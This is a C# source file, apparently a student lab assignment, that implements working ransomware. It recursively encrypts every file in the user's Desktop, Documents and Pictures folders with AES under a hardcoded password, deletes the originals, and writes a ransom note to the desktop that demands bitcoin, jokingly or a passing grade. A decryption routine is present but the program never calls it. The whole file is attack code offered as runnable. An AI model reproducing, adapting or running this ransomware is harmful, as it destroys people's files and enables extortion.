using System;
using System.IO;
using System.Security.Cryptography;

namespace PMRI_lab2
{
    internal class Program
    {
        private const bool DELETE_ALL_ORIGINALS = true; /* CAUTION */
        private const bool ENCRYPT_DESKTOP = true;
        private const bool ENCRYPT_DOCUMENTS = true;
        private const bool ENCRYPT_PICTURES = true;
        private const string ENCRYPTED_FILE_EXTENSION = ".jcrypt";
        private const string ENCRYPT_PASSWORD = "Password1";


        private static string ENCRYPTION_LOG = "";
        private string RANSOM_LETTER =
           "All of your files have been encrypted.\n\n" +
           "To unlock them, please send one bitcoin to my wallet, or grade my lab works to pass for session))" + "\n" +
           "Thank you and have a nice day!\n\n" +
           "Encryption Log:\n" +
           "----------------------------------------\n";
        private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
        private static int encryptedFileCount = 0;


        private void folderEncryption()
        {

            if (ENCRYPT_DESKTOP)
            {
                encryptFolderContents(DESKTOP_FOLDER);
            }

            if (ENCRYPT_PICTURES)
            {
                encryptFolderContents(PICTURES_FOLDER);
            }

            if (ENCRYPT_DOCUMENTS)
            {
                encryptFolderContents(DOCUMENTS_FOLDER);
            }

            if (encryptedFileCount > 0)
            {
                dropRansomLetter();
            }
            else
            {
                Console.Out.WriteLine("No files to encrypt.");
                Environment.Exit(0);
            }
        }

        private void dropRansomLetter()
        {
            StreamWriter ransomWriter = new StreamWriter(DESKTOP_FOLDER + @"\___RECOVER__FILES__" + ENCRYPTED_FILE_EXTENSION + ".txt");
            ransomWriter.WriteLine(RANSOM_LETTER);
            ransomWriter.WriteLine(ENCRYPTION_LOG);
            ransomWriter.Close();
        }


        static void encryptFolderContents(string sDir)
        {
            try
            {
                foreach (string f in Directory.GetFiles(sDir))
                {
                    if (!f.Contains(ENCRYPTED_FILE_EXTENSION))
                    {
                        Console.Out.WriteLine("Encrypting: " + f);
                        FileEncrypt(f, ENCRYPT_PASSWORD);
                    }
                }

                foreach (string d in Directory.GetDirectories(sDir))
                {
                    encryptFolderContents(d);
                }
            }
            catch (System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }
        }

        private static void FileEncrypt(string inputFile, string password)
        {
            //generate random salt
            byte[] salt = GenerateRandomSalt();

            //create output file name
            FileStream fsCrypt = new FileStream(inputFile + ENCRYPTED_FILE_EXTENSION, FileMode.Create);

            //convert password string to byte arrray
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);

            //Set Rijndael symmetric encryption algorithm
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;

            //"What it does is repeatedly hash the user password along with the salt." High iteration counts.
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);

            AES.Mode = CipherMode.CBC;

            // write salt to the begining of the output file, so in this case can be random every time
            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);

            FileStream fsIn = new FileStream(inputFile, FileMode.Open);

            //create a buffer (1mb) so only this amount will allocate in the memory and not the whole file
            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    cs.Write(buffer, 0, read);
                }
                fsIn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                ENCRYPTION_LOG += inputFile + "\n";
                encryptedFileCount++;
                cs.Close();
                fsCrypt.Close();
                if (DELETE_ALL_ORIGINALS)
                {
                    File.Delete(inputFile);
                }
            }
        }

        private static void FileDecrypt(string inputFile, string outputFile, string password)
        {
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            byte[] salt = new byte[32];

            FileStream cryptoFileStream = new FileStream(inputFile, FileMode.Open);
            cryptoFileStream.Read(salt, 0, salt.Length);

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Padding = PaddingMode.PKCS7;
            AES.Mode = CipherMode.CBC;

            CryptoStream cryptoStream = new CryptoStream(cryptoFileStream, AES.CreateDecryptor(), CryptoStreamMode.Read);

            FileStream fileStreamOutput = new FileStream(outputFile, FileMode.Create);

            int read;
            byte[] buffer = new byte[1048576];

            try
            {
                while ((read = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    //Application.DoEvents();
                    fileStreamOutput.Write(buffer, 0, read);
                }
            }
            catch (CryptographicException ex_CryptographicException)
            {
                Console.WriteLine("CryptographicException error: " + ex_CryptographicException.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            try
            {
                cryptoStream.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error by closing CryptoStream: " + ex.Message);
            }
            finally
            {
                fileStreamOutput.Close();
                cryptoFileStream.Close();
            }
        }

        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    // File the buffer with the generated data
                    rng.GetBytes(data);
                }
            }

            return data;
        }

        static void Main(string[] args)
        {
            Program program = new Program();
            program.folderEncryption();
        }
    }
}
